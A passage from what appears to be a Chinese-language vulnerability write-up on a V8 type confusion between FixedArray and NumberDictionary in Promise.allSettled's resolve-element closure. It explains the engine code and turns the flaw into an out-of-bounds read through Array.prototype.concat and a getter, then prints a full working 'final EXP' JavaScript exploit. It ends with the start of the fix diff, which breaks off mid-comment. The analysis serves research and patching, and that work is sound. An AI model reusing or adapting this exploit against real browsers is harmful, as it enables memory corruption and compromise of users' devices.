class_">Handle</span>&lt;<span class="title class_">JSObject</span>&gt; dictionary_holder);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sorting support</span></span><br><span class="line">  <span class="keyword">void</span> <span class="title class_">CopyValuesTo</span>(<span class="title class_">FixedArray</span> elements);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If slow elements are required we will never go back to fast-case</span></span><br><span class="line">  <span class="comment">// for the elements kept in this dictionary.  We require slow</span></span><br><span class="line">  <span class="comment">// elements if an element has been added at an index larger than</span></span><br><span class="line">  <span class="comment">// kRequiresSlowElementsLimit or set_requires_slow_elements() has been called</span></span><br><span class="line">  <span class="comment">// when defining a getter or setter with a number key.</span></span><br><span class="line">  inline bool <span class="title function_">requires_slow_elements</span>();</span><br><span class="line">  inline <span class="keyword">void</span> <span class="title function_">set_requires_slow_elements</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the value of the max number key that has been added to this</span></span><br><span class="line">  <span class="comment">// dictionary.  max_number_key can only be called if</span></span><br><span class="line">  <span class="comment">// requires_slow_elements returns false.</span></span><br><span class="line">  inline uint32_t <span class="title function_">max_number_key</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kEntryValueIndex = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kEntryDetailsIndex = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Bit masks.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kRequiresSlowElementsMask = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> int kRequiresSlowElementsTagSize = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> uint32_t kRequiresSlowElementsLimit = (<span class="number">1</span> &lt;&lt; <span class="number">29</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// JSObjects prefer dictionary elements if the dictionary saves this much</span></span><br><span class="line">  <span class="comment">// memory compared to a fast elements backing store.</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> uint32_t kPreferFastElementsSizeFactor = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">OBJECT_CONSTRUCTORS</span>(<span class="title class_">NumberDictionary</span>,</span><br><span class="line">                      <span class="title class_">Dictionary</span>&lt;<span class="title class_">NumberDictionary</span>, <span class="title class_">NumberDictionaryShape</span>&gt;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>让我们重新来审计<code>PromiseAllResolveElementClosure</code>这个函数，只不过这一次我们关心的是V8如何将promise的处理结果保存至<code>valuesArray</code> 中。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">transitioning macro <span class="title class_">PromiseAllResolveElementClosure</span>&lt;<span class="attr">F</span>: type&gt;(</span><br><span class="line">    implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Update the value depending on whether Promise.all or</span></span><br><span class="line">  <span class="comment">// Promise.allSettled is called.</span></span><br><span class="line">  <span class="keyword">const</span> updatedValue = wrapResultFunctor.<span class="title class_">Call</span>(nativeContext, value); <span class="comment">// ---&gt; [3]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> identityHash =</span><br><span class="line">      <span class="title class_">LoadJSReceiverIdentityHash</span>(<span class="keyword">function</span>) otherwise unreachable;</span><br><span class="line">  <span class="title function_">assert</span>(identityHash &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> index = identityHash - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if we need to grow the [[ValuesArray]] to store &#123;value&#125; at &#123;index&#125;.</span></span><br><span class="line">  <span class="keyword">const</span> valuesArray = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">JSArray</span>&gt;(</span><br><span class="line">      context[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                  kPromiseAllResolveElementValuesArraySlot]);</span><br><span class="line">  <span class="keyword">const</span> elements = <span class="title class_">UnsafeCast</span>&lt;<span class="title class_">FixedArray</span>&gt;(valuesArray.<span class="property">elements</span>);   <span class="comment">// ---&gt; [4]</span></span><br><span class="line">  <span class="keyword">const</span> valuesLength = <span class="title class_">Convert</span>&lt;intptr&gt;(valuesArray.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">if</span> (index &lt; valuesLength) &#123;</span><br><span class="line">    <span class="comment">// The &#123;index&#125; is in bounds of the &#123;values_array&#125;,</span></span><br><span class="line">    <span class="comment">// just store the &#123;value&#125; and continue.</span></span><br><span class="line">    elements.<span class="property">objects</span>[index] = updatedValue;                        <span class="comment">// ---&gt; [5]</span></span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在代码 [4] 处，<code>valuesArray</code> 的element被直接当作FixedArray来进行处理。但与此同时，我们已经获得了<code>valuesArray</code>，并能够对其进行操作了。通过在其上设置一个较大的索引值，我们可以把它转换为一个dictionary array，此时，就会出现FixedArray和NumberDictionary之间的类型混淆。</p>
<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>乍一看上去，利用FixedArray和NumberDictionary之间的类型混淆似乎很容易就能造成可控的越界写。当V8想要将结果保存至<code>valuesArray</code>时，会首先检查index是否越界。如果index &lt; array.length，那么V8就直接将结果写入array.elements（如代码 [5] 所示）。这是因为V8假定了<code>valuesArray</code>一定是属于PACKED_ELEMENT类型，使用的是FixedArray来存储元素，这种类型的数组，一定会有FixedArray长度大于等于array长度的约束。如果满足了index &lt; array.length，显然也就满足了index &lt; FixedArray.length，因此向FixedArray写入数据是不可能发生越界的。但利用类型混淆，我们可以将<code>valuesArray</code>转换为dictionary mode，此时使用的是NumberDictionary存储元素，array.length可以是一个很大的值，而NumberDictionary的size却可以比较小。这样一来，我们就可以绕过index &lt; array.length的检查，造成越界写。但实际情况真的是这样吗？</p>
<p>经过进一步测试发现，在Torque编译器生成形如 <em>elements.objects[index] &#x3D; value</em> 的代码时，是会额外加入越界检查的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/builtins/torque-internal.tq</span></span><br><span class="line">struct <span class="title class_">Slice</span>&lt;<span class="attr">T</span>: type&gt; &#123;</span><br><span class="line">  macro <span class="title class_">TryAtIndex</span>(<span class="attr">index</span>: intptr):&amp;T labels <span class="title class_">OutOfBounds</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Convert</span>&lt;uintptr&gt;(index) &lt; <span class="title class_">Convert</span>&lt;uintptr&gt;(<span class="variable language_">this</span>.<span class="property">length</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="attr">unsafe</span>::<span class="title class_">NewReference</span>&lt;T&gt;(</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">object</span>, <span class="variable language_">this</span>.<span class="property">offset</span> + index * %<span class="title class_">SizeOf</span>&lt;T&gt;());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      goto <span class="title class_">OutOfBounds</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这会最终执行到’unreachable code’，然后导致进程崩溃。因此，我们必须考虑其他方式。</p>
<p>另外的一个限制在于，越界写入的数据内容并不是我们可以控制的，它总是一个JSObject的地址，这个object生成于代码 [2] 处，例如： <em>{status: “fulfilled”, value: 1}</em> 。</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>上述利用思路存在着一些缺点：</p>
<ul>
<li>它不是一个100%成功率的方案</li>
<li>它无法在32位环境中使用</li>
</ul>
<p>而当时Pixel 4上的Chrome是32位的，意味着并不能满足要求。在之后的几周时间，我们找到了新的利用思路。</p>
<p>重新回顾这张对比图：</p>
<p><img src="https://vul.360.net/wp-content/uploads/2021/08/FixedArray_NumberDictionary-2.png" alt="img"></p>
<p>除了修改Capacity之外，是否有其他更好的选择？经过研究我们发现，MaxNumberKey这个字段有着非常特殊的含义。MaxNumberKey代表了这个数组中保存的所有元素的最大索引值，同时，其最低有效位表明了数组中是否存在特殊元素，例如accessors。以如下代码为例，我们可以在数组上定义一个getter：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = []</span><br><span class="line">arr[<span class="number">0x10000</span>] = <span class="number">1</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(arr, <span class="number">0</span>, &#123;</span><br><span class="line">  get : <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getter called&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure>

<p>此时，MaxNumberKey最低有效位为0，代表存在特殊元素。但是通过漏洞，我们可以将其覆写为一个JSObject的地址，而在V8中，任何HeapObject地址的最低位，恰好为1。即经过覆写的数组，即使上面定义了特殊元素，V8也会认为它不再特殊。</p>
<p>接下来，我们需要寻找能够充分利用这一影响的代码，在这里我们选择了Array.prototype.concat函数。该函数会调用至<code>IterateElements</code>，用于迭代被连接的数组。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bool <span class="title class_">IterateElements</span>(<span class="title class_">Isolate</span>* isolate, <span class="title class_">Handle</span>&lt;<span class="title class_">JSReceiver</span>&gt; receiver,</span><br><span class="line">                     <span class="title class_">ArrayConcatVisitor</span>* visitor) &#123;</span><br><span class="line">  <span class="comment">/* skip */</span></span><br><span class="line">  <span class="keyword">if</span> (!visitor-&gt;<span class="title function_">has_simple_elements</span>() ||</span><br><span class="line">      !<span class="title class_">HasOnlySimpleElements</span>(isolate, *receiver)) &#123;<span class="comment">// ---&gt; [6]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IterateElementsSlow</span>(isolate, receiver, length, visitor);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* skip */</span></span><br><span class="line">  <span class="title function_">FOR_WITH_HANDLE_SCOPE</span>(isolate, int, j = <span class="number">0</span>, j, j &lt; fast_length, j++, &#123;</span><br><span class="line">    <span class="title class_">Handle</span>&lt;<span class="title class_">Object</span>&gt; <span class="title function_">element_value</span>(elements-&gt;<span class="title function_">get</span>(j), isolate);<span class="comment">// ---&gt; [7]</span></span><br><span class="line">    <span class="keyword">if</span> (!element_value-&gt;<span class="title class_">IsTheHole</span>(isolate)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!visitor-&gt;<span class="title function_">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title class_">Maybe</span>&lt;bool&gt; maybe = <span class="title class_">JSReceiver</span>::<span class="title class_">HasElement</span>(array, j);</span><br><span class="line">      <span class="keyword">if</span> (maybe.<span class="title class_">IsNothing</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">if</span> (maybe.<span class="title class_">FromJust</span>()) &#123;</span><br><span class="line">        <span class="title function_">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(isolate, element_value,</span><br><span class="line">            <span class="title class_">JSReceiver</span>::<span class="title class_">GetElement</span>(isolate, array, j), <span class="literal">false</span>);<span class="comment">// ---&gt; [8]</span></span><br><span class="line">        <span class="keyword">if</span> (!visitor-&gt;<span class="title function_">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="comment">/* skip */</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>在代码[6]处，V8检查了数组是否含有特殊元素，我们通过覆写MaxNumberKey，可以绕过这一检查，让函数进入后续的快速遍历路径。在代码[8]处，GetElement将触发accessor，执行自定义的js代码，从而有机会将数组的长度改为一个更小的值。随着遍历循环中的索引不断增大，最终在代码[7]处，会发生越界读。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr; <span class="comment">// 假设arr是一个类型混淆后的数组</span></span><br><span class="line"><span class="keyword">var</span> victim_arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(arr, <span class="number">0</span>, &#123;</span><br><span class="line">  get : <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;=== getter called ===&quot;</span>);</span><br><span class="line">    victim_arr.<span class="property">length</span> = <span class="number">0x10</span>;   <span class="comment">// 在回调函数中修改数组长度</span></span><br><span class="line">    <span class="title function_">gc</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 越界读</span></span><br><span class="line">arr.<span class="title function_">concat</span>(victim_arr);</span><br></pre></td></tr></table></figure>

<p>通过上述方案，我们将原本的类型混淆，转换成了另一处越界读问题。利用越界读，我们就拥有了fake obj的能力，进而也可以轻松实现任意地址读写了。</p>
<p>最终EXP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyCls</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">executor</span>) &#123;</span><br><span class="line">        <span class="title function_">executor</span>(custom_resolve, custom_reject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">resolve</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">then</span>: <span class="function">(<span class="params">fulfill, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            	<span class="keyword">if</span>(count==<span class="number">4</span>||count==<span class="number">3</span>&amp;&amp;count!=<span class="number">0</span>)&#123;</span><br><span class="line">            	    count--; </span><br><span class="line">            	    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);    </span><br><span class="line">            	    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call fulfill&quot;</span>);</span><br><span class="line">                    <span class="title function_">fulfill</span>(); </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(count==<span class="number">2</span>)&#123;</span><br><span class="line">                    count--;    </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);  </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call fulfill&quot;</span>);</span><br><span class="line">                    <span class="title function_">fulfill</span>();  </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;call reject&quot;</span>);</span><br><span class="line">                    <span class="title function_">reject</span>(); </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(count==<span class="number">1</span>)&#123;</span><br><span class="line">                    count--;    </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(count);  </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;last_fulfilled ====================&gt; fulfill&quot;</span>);</span><br><span class="line">		    last_fulfilled = fulfill;</span><br><span class="line">                    last_rejected = reject;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;	</span><br><span class="line">		    count--;</span><br><span class="line">		&#125;	</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">custom_resolve</span>(<span class="params">arr</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;custom_resolve called&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;-------------------------------------------------------------------&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(count)</span><br><span class="line">  <span class="keyword">if</span> (count==<span class="number">1</span>)&#123;</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">    %<span class="title class_">SystemBreak</span>(); </span><br><span class="line">    arr[<span class="number">0x10000</span>] = <span class="number">1</span>;</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">    %<span class="title class_">SystemBreak</span>(); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (count==<span class="number">0</span>)&#123;</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">    %<span class="title class_">SystemBreak</span>(); </span><br><span class="line">    <span class="keyword">var</span> victim_arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim_arr[<span class="number">1</span>]=data_buf;</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(data_buf);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(arr, <span class="number">0</span>, &#123;</span><br><span class="line">      get : <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;getter called&quot;</span>);</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(arr);</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(victim_arr);</span><br><span class="line">        %<span class="title class_">SystemBreak</span>();</span><br><span class="line">        <span class="title function_">last_fulfilled</span>();</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(victim_arr);</span><br><span class="line">        %<span class="title class_">SystemBreak</span>();</span><br><span class="line">        victim_arr.<span class="property">length</span> = <span class="number">0x10</span>;   </span><br><span class="line">        %<span class="title class_">DebugPrint</span>(victim_arr);</span><br><span class="line">        %<span class="title class_">SystemBreak</span>();</span><br><span class="line">        <span class="title function_">gc</span>();</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(victim_arr);</span><br><span class="line">        %<span class="title class_">DebugPrint</span>(data_buf);</span><br><span class="line">        %<span class="title class_">SystemBreak</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">    <span class="keyword">let</span> a = arr.<span class="title function_">concat</span>(victim_arr);</span><br><span class="line">    <span class="title function_">print</span>(a[<span class="number">65538</span>]);</span><br><span class="line">    %<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">    %<span class="title class_">SystemBreak</span>(); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">custom_reject</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;custom_reject called&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> last_fulfilled = [];</span><br><span class="line"><span class="keyword">var</span> last_rejected = [];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> origin_resolve = <span class="title class_">Promise</span>.<span class="property">resolve</span>;</span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = <span class="number">1</span>;</span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">resolve</span> = origin_resolve;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">tmp[<span class="title class_">Symbol</span>.<span class="property">isConcatSpreadable</span>] = <span class="literal">false</span>;  <span class="comment">// 先设置为不可展开</span></span><br><span class="line">tmp[<span class="title class_">Symbol</span>.<span class="property">isConcatSpreadable</span>] = <span class="literal">true</span>;   <span class="comment">// 再设置为可展开</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">apply</span>(<span class="title class_">Promise</span>.<span class="property">allSettled</span>, <span class="title class_">MyCls</span>, [tmp]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="七、修复方法"><a href="#七、修复方法" class="headerlink" title="七、修复方法"></a>七、修复方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> transitioning macro <span class="title class_">PromiseAllResolveElementClosure</span>&lt;<span class="attr">F</span>: type&gt;(</span><br><span class="line">     implicit <span class="attr">context</span>: <span class="title class_">Context</span>)(</span><br><span class="line">-    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">+    <span class="attr">value</span>: <span class="title class_">JSAny</span>, <span class="attr">function</span>: <span class="title class_">JSFunction</span>, <span class="attr">wrapResultFunctor</span>: F,</span><br><span class="line">+    <span class="attr">hasResolveAndRejectClosures</span>: constexpr bool): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">   <span class="comment">// We use the &#123;function&#125;s context as the marker to remember whether this</span></span><br><span class="line">   <span class="comment">// resolve element closure was already called. It points to the resolve</span></span><br><span class="line">   <span class="comment">// element context (which is a FunctionContext) until it was called the</span></span><br><span class="line">@@ -<span class="number">98</span>,<span class="number">10</span> +<span class="number">99</span>,<span class="number">6</span> @@</span><br><span class="line">   <span class="keyword">const</span> nativeContext = <span class="title class_">LoadNativeContext</span>(context);</span><br><span class="line">   <span class="keyword">function</span>.<span class="property">context</span> = nativeContext;</span><br><span class="line"> </span><br><span class="line">-  <span class="comment">// Update the value depending on whether Promise.all or</span></span><br><span class="line">-  <span class="comment">// Promise.allSettled is called.</span></span><br><span class="line">-  <span class="keyword">const</span> updatedValue = wrapResultFunctor.<span class="title class_">Call</span>(nativeContext, value);</span><br><span class="line">-</span><br><span class="line">   <span class="comment">// Determine the index from the &#123;function&#125;.</span></span><br><span class="line">   <span class="title function_">assert</span>(kPropertyArrayNoHashSentinel == <span class="number">0</span>);</span><br><span class="line">   <span class="keyword">const</span> identityHash =</span><br><span class="line">@@ -<span class="number">123</span>,<span class="number">6</span> +<span class="number">120</span>,<span class="number">27</span> @@</span><br><span class="line">       context.<span class="property">elements</span>[<span class="title class_">PromiseAllResolveElementContextSlots</span>::</span><br><span class="line">                            kPromiseAllResolveElementValuesSlot] = values;</span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="comment">// Promise.allSettled, for each input element, has both a resolve and a reject</span></span><br><span class="line">+  <span class="comment">// closure that share an [[AlreadyCalled]] boolean. That is, the input element</span></span><br><span class="line">+  <span class="comment">// can only be settled once: after resolve is called, reject returns early,</span></span><br><span class="line">+  <span class="comment">// and vice versa. Using &#123;function&#125;&#x27;s context as the marker only tracks</span></span><br><span class="line">+  <span class="comment">// per-closure instead of per-element. When the second 